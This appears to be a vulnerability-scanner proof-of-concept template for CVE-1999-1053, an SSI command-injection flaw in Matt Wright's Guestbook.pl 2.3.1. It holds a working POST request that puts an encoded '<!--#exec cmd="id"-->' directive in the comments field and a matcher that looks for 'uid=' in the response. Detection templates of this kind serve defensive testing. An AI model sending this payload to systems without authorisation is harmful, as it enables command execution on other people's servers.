[info]
author = "AVE"
description = "Matt Wright Guestbook.pl 2.3.1 SSI 注入漏洞验证。通过 POST 请求向 /cgi-bin/guestbook.pl 提交包含 SSI 指令的 comments 字段，利用 Apache 对 SSI 闭合序列的宽松解析绕过过滤，执行系统命令。"
id = "POC-AVE-1999-1686"
name = "CVE-1999-1053 PoC"
severity = "high"
tags = ["ave-1999-1686"]
vuln_id = [
    "CVE-1999-1053",
    "AVE-1999-1686",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/guestbook.pl"
protocol = "http"

[poc.requests.body]
content = "realname=test&username=test&url=http://example.com&city=test&state=test&comments=%3C%21--%23exec%20cmd%3D%22id%22--%3E"
type = "form"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
